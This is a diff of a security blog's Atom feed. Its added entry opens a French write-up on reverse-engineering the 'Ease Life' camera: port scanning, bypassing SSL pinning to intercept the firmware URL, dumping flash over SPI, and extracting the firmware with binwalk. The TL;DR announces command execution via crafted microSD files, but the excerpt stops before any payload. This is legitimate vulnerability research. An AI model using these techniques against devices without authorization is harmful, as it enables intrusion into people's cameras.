@@ -1,4 +1,1069 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://gohugo.io/" version="0.147.3">Hugo</generator><title>Security on 0x09</title><subtitle>Just Trying To Master Some 0ffs3c Skills...</subtitle><link href="https://0x09.dev/tags/Security/" rel="alternate" type="text/html" title="html"/><link href="https://0x09.dev/tags/Security/feed.xml" rel="self" type="application/atom+xml" title="atom"/><updated>2025-09-06T19:15:22+02:00</updated><author><name>Skander BELABED</name><email>belabedskander@gmail.com</email></author><id>https://0x09.dev/tags/Security/</id><entry><title>[CVE-2025-52089] Toto Découvre Une "Interface De Debug"</title><link href="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/" rel="alternate" type="text/html" hreflang="en"/><id>https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/</id><author><name>Skander BELABED</name></author><published>2025-07-10T20:18:18+02:00</published><updated>2025-08-30T19:30:52+02:00</updated><content type="html">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://gohugo.io/" version="0.147.3">Hugo</generator><title>Security on 0x09</title><subtitle>Just Trying To Master Some 0ffs3c Skills...</subtitle><link href="https://0x09.dev/tags/Security/" rel="alternate" type="text/html" title="html"/><link href="https://0x09.dev/tags/Security/feed.xml" rel="self" type="application/atom+xml" title="atom"/><updated>2025-09-14T21:07:29+02:00</updated><author><name>Skander BELABED</name><email>belabedskander@gmail.com</email></author><id>https://0x09.dev/tags/Security/</id><entry><title>[PARTIE 1] Analyse de la caméra de surveillance 'Ease Life' - Retour à l'usine</title><link href="https://0x09.dev/posts/ease_life_security_camera_part_1/" rel="alternate" type="text/html" hreflang="en"/><id>https://0x09.dev/posts/ease_life_security_camera_part_1/</id><author><name>Skander BELABED</name></author><published>2025-09-06T18:42:29+02:00</published><updated>2025-09-14T21:07:08+02:00</updated><content type="html">
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/banner.png" style="width: 100%; height: 100%;" />&lt;/figure>
+&lt;hr>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h1 id="tldr"
+>
+TL;DR
+&lt;/h1>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#tldr" class="gblog-post__anchor clip flex align-center" aria-label="Anchor TL;DR" href="#tldr">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>En raison d&amp;rsquo;une fonctionnalité de test d&amp;rsquo;usine activée sur le firmware d&amp;rsquo;une caméra Ease Life, il est possible de réaliser de l&amp;rsquo;exécution de commandes à travers l&amp;rsquo;insertion d&amp;rsquo;une microSD contenant une série de fichiers forgés.&lt;/p>
+&lt;hr>
+&lt;p>&lt;strong>SOMMAIRE&lt;/strong>
+&lt;div class="gblog-toc gblog-toc__level--3">
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#tldr">TL;DR&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#introduction">Introduction&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#le-sujet">Le sujet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#énumération--des-fonctionnalités-de-la-surface-dattaque">Énumération &amp;quot; &lt;del>des fonctionnalités&lt;/del>&amp;quot; de la surface d&amp;rsquo;attaque&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#obtention-du-firmware">Obtention du firmware&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#par-interception-aucun-risque-dincendie">Par interception (aucun risque d&amp;rsquo;incendie)&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#extraction-via-spi-léger-risque-dincendie">Extraction via SPI (léger risque d&amp;rsquo;incendie)&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#analyse-du-firmware">Analyse du firmware&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#marchons-sur-le-binaire">Marchons sur le binaire&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#quête-secondaire">Quête secondaire&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#retour-à-lusine">Retour à l&amp;rsquo;usine&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#assemblons-le-tout">Assemblons le tout&lt;/a>
+&lt;ul>
+&lt;li>&lt;a href="#factorytestsh">factorytest.sh&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#testmd5sum">test.md5sum&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#authini">auth.ini&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#factorytest">factorytest/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#r00t">R00T&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="#références">Références&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;hr />
+&lt;/div>
+&lt;/p>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h1 id="introduction"
+>
+Introduction
+&lt;/h1>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#introduction" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Introduction" href="#introduction">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="le-sujet"
+>
+Le sujet
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#le-sujet" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Le sujet" href="#le-sujet">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Le sujet du jour est la caméra de surveillance &lt;strong>&amp;lsquo;Ease Life&amp;rsquo;&lt;/strong> vendue par certaines plateformes dont AliExpress pour un prix très attractif &lt;em>(même pas une dizaine d&amp;rsquo;euros)&lt;/em>. L&amp;rsquo;objectif principal sera donc de voir &lt;strong>si ce prix inclut la sécurité&lt;/strong> en suivant la méthodologie &lt;strong>&amp;ldquo;navigation à vue&amp;rdquo;&lt;/strong>.&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/aliexpress-product.png" style="width: 100%; height: 100%;" />&lt;/figure>&lt;figcaption style="text-align: center;">Caméra Ease-Life&lt;/figcaption>&lt;/figure>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="énumération--des-fonctionnalités-de-la-surface-dattaque"
+>
+Énumération &amp;quot; &lt;del>des fonctionnalités&lt;/del>&amp;quot; de la surface d&amp;rsquo;attaque
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#énumération--des-fonctionnalités-de-la-surface-dattaque" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Énumération &amp;quot; des fonctionnalités&amp;quot; de la surface d&amp;rsquo;attaque" href="#%c3%a9num%c3%a9ration--des-fonctionnalit%c3%a9s-de-la-surface-dattaque">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>La configuration et l&amp;rsquo;utilisation de la caméra se font principalement via une &lt;a
+class="gblog-markdown__link"
+href="https://play.google.com/store/apps/details?id=com.vitec.easelifeEn&amp;amp;hl=fr"
+>application mobile&lt;/a> compatible Android et iOS :&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/ease-life-play-store.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>https://play.google.com/store/apps/details?id=com.vitec.easelifeEn&amp;hl=fr&lt;/figure>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/ease-life-home.png" style="width: 50%; height: 50%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Accueil Ease Life Android&lt;/figure>
+&lt;p>Une fois la caméra enrôlée et configurée, voici une liste des fonctionnalités et composants les plus importants pour la suite :&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Nom&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Module Bluetooth&lt;/td>
+&lt;td>utilisé uniquement par une des options d&amp;rsquo;enrôlement afin de transmettre à la caméra les informations du Wi-Fi sur lequel se connecter&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Module Wi-Fi&lt;/td>
+&lt;td>utilisé par la caméra pour avoir un accès internet afin de pouvoir communiquer avec l&amp;rsquo;API &lt;em>(configuration)&lt;/em> et transmettre le flux vidéo&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Lecteur microSD&lt;/td>
+&lt;td>utilisé pour du stockage interne de flux vidéo &lt;em>(spoiler : mais pas que&amp;hellip;)&lt;/em>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>Un rapide scan de ports nous démontre qu&amp;rsquo;aucun service n&amp;rsquo;est exposé par la caméra :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ nmap -p- 10.166.181.156 --open
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.80 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2025-09-05 22:42 CEST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Stats: 0:00:34 elapsed&lt;span class="p">;&lt;/span> &lt;span class="m">0&lt;/span> hosts completed &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> up&lt;span class="o">)&lt;/span>, &lt;span class="m">1&lt;/span> undergoing Connect Scan
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connect Scan Timing: About 80.84% &lt;span class="k">done&lt;/span>&lt;span class="p">;&lt;/span> ETC: 15:43 &lt;span class="o">(&lt;/span>0:00:08 remaining&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 46.41 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Essayons donc d&amp;rsquo;obtenir le firmware de la caméra afin d&amp;rsquo;avoir un peu plus d&amp;rsquo;informations sur son fonctionnement interne.&lt;/p>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h1 id="obtention-du-firmware"
+>
+Obtention du firmware
+&lt;/h1>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#obtention-du-firmware" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Obtention du firmware" href="#obtention-du-firmware">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="par-interception-aucun-risque-dincendie"
+>
+Par interception (aucun risque d&amp;rsquo;incendie)
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#par-interception-aucun-risque-dincendie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Par interception (aucun risque d&amp;rsquo;incendie)" href="#par-interception-aucun-risque-dincendie">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Une des premières notifications obtenues après configuration de la caméra était une invitation à mettre à jour le firmware de la caméra.&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/ease-life-firm-update.png" style="width: 50%; height: 50%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Notification de mise à jour du firmware&lt;/figure>
+&lt;p>À partir de là, on peut supposer que la localisation du nouveau firmware à télécharger doit sans doute transiter par l&amp;rsquo;application mobile, une analyse de la communication HTTP entre l&amp;rsquo;API et l&amp;rsquo;application mobile s&amp;rsquo;impose donc.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Informations sur l&amp;rsquo;environnement utilisé&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Machine virtuelle &lt;em>Android 12 | x86_64&lt;/em> avec &lt;a
+class="gblog-markdown__link"
+href="https://developer.android.com/studio/run/managing-avds"
+>Virtual Device Manager&lt;/a> d&amp;rsquo;&lt;a
+class="gblog-markdown__link"
+href="https://developer.android.com/studio"
+>Android Studio&lt;/a>&lt;/li>
+&lt;li>Root de la machine virtuelle avec &lt;a
+class="gblog-markdown__link"
+href="https://gitlab.com/newbit/rootAVD"
+>rootAVD&lt;/a>&lt;/li>
+&lt;li>Contournement du &lt;a
+class="gblog-markdown__link"
+href="https://cheatsheetseries.owasp.org/cheatsheets/Pinning_Cheat_Sheet.html"
+>SSL Pinnig&lt;/a> avec &lt;a
+class="gblog-markdown__link"
+href="https://github.com/frida"
+>Frida&lt;/a> et le code &lt;a
+class="gblog-markdown__link"
+href="https://codeshare.frida.re/@fdciabdul/frida-multiple-bypass/"
+>fdciabdul/frida-multiple-bypass&lt;/a>&lt;/li>
+&lt;li>Interception avec &lt;a
+class="gblog-markdown__link"
+href="https://portswigger.net/burp"
+>BurpSuite&lt;/a>&lt;/li>
+&lt;/ul>&lt;/blockquote>
+&lt;p>Après analyse des requêtes émises et des réponses reçues, un endpoint en particulier ressort : &lt;strong>/api/update/CheckDeviceUpdate&lt;/strong>.&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/update-url-enc.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Réponse HTTP contenant l'URL de téléchargement du firmware chiffré&lt;/figure>
+&lt;p>En effet, on peut voir que dans la réponse HTTP on a potentiellement une bonne et une mauvaise nouvelle :&lt;/p>
+&lt;ul>
+&lt;li>Le JSON renvoyé contient un champ &lt;strong>url&lt;/strong> qui semble contenir le lien de téléchargement du firmware &lt;strong>z10kd-l_f3m10_APP2.3.0.11291_ota.enc&lt;/strong>&lt;/li>
+&lt;li>Le fichier dans le lien de téléchargement a une extension &lt;strong>.enc&lt;/strong>, convention pour dire qu&amp;rsquo;il est &lt;em>encrypted&lt;/em>&lt;/li>
+&lt;/ul>
+&lt;p>Une fois le firmware téléchargé, on peut observer que notre hypothèse de chiffrement est appuyée par le fait que &lt;a
+class="gblog-markdown__link"
+href="https://github.com/ReFirmLabs/binwalk"
+>Binwalk&lt;/a> n&amp;rsquo;identifie aucune signature connue :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ binwalk -M z10kd-l_f3m10_APP2.3.0.11291_ota.enc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Analyzed &lt;span class="m">1&lt;/span> file &lt;span class="k">for&lt;/span> &lt;span class="m">110&lt;/span> file signatures &lt;span class="o">(&lt;/span>&lt;span class="m">249&lt;/span> magic patterns&lt;span class="o">)&lt;/span> in 38.0 milliseconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut également calculer &lt;a
+class="gblog-markdown__link"
+href="https://securitylab.servicenow.com/research/2025-04-07-Binary-Data-Analysis-The-Role-of-Entropy/"
+>l&amp;rsquo;entropie&lt;/a> du firmware toujours avec Binwalk :&lt;/p>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">L&amp;rsquo;entropie désigne le taux de données aléatoires dans une code binaire sur une échelle de 0 à 8. Une entropie élevée désigne un code compressé ou chiffré.&lt;/div>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ binwalk -E z10kd-l_f3m10_APP2.3.0.11291_ota.enc -p entropy.png
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Calculating file entropy...done.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>En analysant le résultat, on peut voir une entropie très élevée et constante au niveau de tout le firmware, démontrant la présence de données totalement aléatoires et probablement chiffrées.&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/enc-firm-entropy.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Graphe d'entropie du firmware z10kd-l_f3m10_APP2.3.0.11291_ota.enc&lt;/figure>
+&lt;p>Le firmware obtenu n&amp;rsquo;étant pas exploitable directement, passons à une méthode d&amp;rsquo;obtention du firmware quasi &amp;ldquo;sûre&amp;rdquo;.&lt;/p>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="extraction-via-spi-léger-risque-dincendie"
+>
+Extraction via SPI (léger risque d&amp;rsquo;incendie)
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#extraction-via-spi-léger-risque-dincendie" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Extraction via SPI (léger risque d&amp;rsquo;incendie)" href="#extraction-via-spi-l%c3%a9ger-risque-dincendie">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">Une description plus détaillée de la méthode et des outils utilisés pour l&amp;rsquo;extraction de firmwares via SPI est présente dans l&amp;rsquo;article &lt;a
+class="gblog-markdown__link"
+href="../toto_decouvre_une_interface_de_debug/#extraction-du-firmware-via-spi"
+>
+[CVE-2025-52089] Toto Découvre Une &amp;ldquo;Interface De Debug&amp;rdquo;
+&lt;/a>&lt;/div>
+&lt;/blockquote>
+&lt;p>Après ouverture de la caméra, on peut clairement identifier un composant à huit pattes ayant comme référence &lt;strong>PY25Q64HA&lt;/strong>&lt;/p>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">Une des méthodes pour identifier une mémoire flash de manière visuelle est de chercher un composant ayant dans sa référence le préfixe numérique &lt;strong>25&lt;/strong> tel que PY&lt;strong>25&lt;/strong>Q64H (cela reste une convention de nommage et des exceptions existent donc)&lt;/div>
+&lt;/blockquote>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/disass-camera.png" style="width: 70%; height: 60%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Mémoire flash PY25Q64HA&lt;/figure>
+&lt;p>La consultation de la documentation nous confirme que c&amp;rsquo;est bien une mémoire flash NOR qui a de grandes chances de contenir le firmware de la caméra&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/flash-doc.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>https://datasheet4u.com/pdf-down/P/Y/2/PY25Q64HA-Puya.pdf&lt;/figure>
+&lt;p>Nos outils étant prêts et branchés, passons donc à l&amp;rsquo;extraction du contenu de la mémoire avec un &lt;a
+class="gblog-markdown__link"
+href="https://flipperzero.one/"
+>Flipper Zero&lt;/a> en utilisant &lt;a
+class="gblog-markdown__link"
+href="https://lab.flipper.net/apps/spi_mem_manager"
+>SPI Mem Manager&lt;/a>&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/fz-spi-setup.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Branchement Flipper Zero pour extraction SPI&lt;/figure>
+&lt;p>La lecture terminée, on obtient un firmware de 8 mégaoctets et en recalculant l&amp;rsquo;entropie on peut clairement distinguer une différence par rapport au firmware chiffré précédemment obtenu :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ du -h firm.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8,0M firm.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ binwalk -E firm.bin -p entropy-unc.png
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Calculating file entropy...done.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/unenc-firm-entropy.png" style="width: 100%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Graphe d'entropie du firmware extrait via SPI&lt;/figure>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h1 id="analyse-du-firmware"
+>
+Analyse du firmware
+&lt;/h1>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#analyse-du-firmware" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Analyse du firmware" href="#analyse-du-firmware">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="marchons-sur-le-binaire"
+>
+Marchons sur le binaire
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#marchons-sur-le-binaire" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Marchons sur le binaire" href="#marchons-sur-le-binaire">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>On va commencer par analyser et extraire le contenu du firmware avec l&amp;rsquo;outil &lt;a
+class="gblog-markdown__link"
+href="https://github.com/ReFirmLabs/binwalk"
+>Binwalk&lt;/a> :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ binwalk -e firm.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /tmp/extractions/firm.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DECIMAL HEXADECIMAL DESCRIPTION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">144268&lt;/span> 0x2338C CRC32 polynomial table, little endian
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">183521&lt;/span> 0x2CCE1 U-Boot version string: 2013.10.0-AK_V2.0.03 &lt;span class="o">(&lt;/span>May &lt;span class="m">31&lt;/span> &lt;span class="m">2024&lt;/span> - 09:39:14&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">327680&lt;/span> 0x50000 uImage firmware image, header size: &lt;span class="m">64&lt;/span> bytes, data size: &lt;span class="m">1395664&lt;/span> bytes, compression: none, CPU: ARM, OS: Linux, image type: OS Kernel Image,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> load address: 0x81808000, entry point: 0x81808040, creation time: 2024-05-31 01:40:34, image name: &lt;span class="s2">&amp;#34;Linux-3.4.35&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1966080&lt;/span> 0x1E0000 SquashFS file system, little endian, version: 4.0, compression: xz, inode count: 284, block size: 131072, image size: &lt;span class="m">1806528&lt;/span> bytes,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> created: 2024-05-31 01:41:58
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">4063232&lt;/span> 0x3E0000 SquashFS file system, little endian, version: 4.0, compression: xz, inode count: 85, block size: 131072, image size: &lt;span class="m">3023262&lt;/span> bytes, created:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 2024-12-03 01:42:54
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">7405568&lt;/span> 0x710000 JFFS2 filesystem, little endian, nodes: 482, total size: &lt;span class="m">913420&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of uimage data at offset 0x50000 completed successfully
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of squashfs data at offset 0x1E0000 completed successfully
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of squashfs data at offset 0x3E0000 completed successfully
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extraction of jffs2 data at offset 0x710000 completed successfully
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Analyzed &lt;span class="m">1&lt;/span> file &lt;span class="k">for&lt;/span> &lt;span class="m">110&lt;/span> file signatures &lt;span class="o">(&lt;/span>&lt;span class="m">249&lt;/span> magic patterns&lt;span class="o">)&lt;/span> in 777.0 milliseconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cette fois-ci Binwalk identifie un bon nombre de signatures, concentrons-nous sur les systèmes de fichier qui sont plus aptes à contenir la couche applicative de la caméra :&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Offset 0x1E0000&lt;/strong> : Système de fichier &lt;a
+class="gblog-markdown__link"
+href="https://en.wikipedia.org/wiki/SquashFS"
+>SquashFS&lt;/a> &lt;em>(lecture seule)&lt;/em>&lt;/li>
+&lt;li>&lt;strong>Offset 0x3E0000&lt;/strong> : Système de fichier &lt;a
+class="gblog-markdown__link"
+href="https://en.wikipedia.org/wiki/SquashFS"
+>SquashFS&lt;/a> &lt;em>(lecture seule)&lt;/em>&lt;/li>
+&lt;li>&lt;strong>Offset 0x710000&lt;/strong> : Système de fichier &lt;a
+class="gblog-markdown__link"
+href="https://en.wikipedia.org/wiki/JFFS2"
+>JFFS2&lt;/a> &lt;em>(lecture/écriture)&lt;/em>&lt;/li>
+&lt;/ol>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">Pour des raisons de performances, &lt;em>SquashFS&lt;/em> a été pensé pour être un système de fichier compressé en lecture seule donc censé contenir des données immuables au niveau firmware telles que l&amp;rsquo;applicatif lié à la vidéo-surveillance. A l&amp;rsquo;oposé, &lt;em>JFFS2&lt;/em> est un système en lecture et écriture, pouvant donner place à des données variables telles que la configuration de la caméra.&lt;/div>
+&lt;/blockquote>
+&lt;p>L&amp;rsquo;extraction &lt;em>Binwalk&lt;/em> nous donne l&amp;rsquo;arborescence ci-dessous :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── 1E0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── squashfs-root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── data -&amp;gt; /tmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── etc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── etc_default
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── init -&amp;gt; sbin/init
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── lib
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── linuxrc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── mnt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── opt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── proc
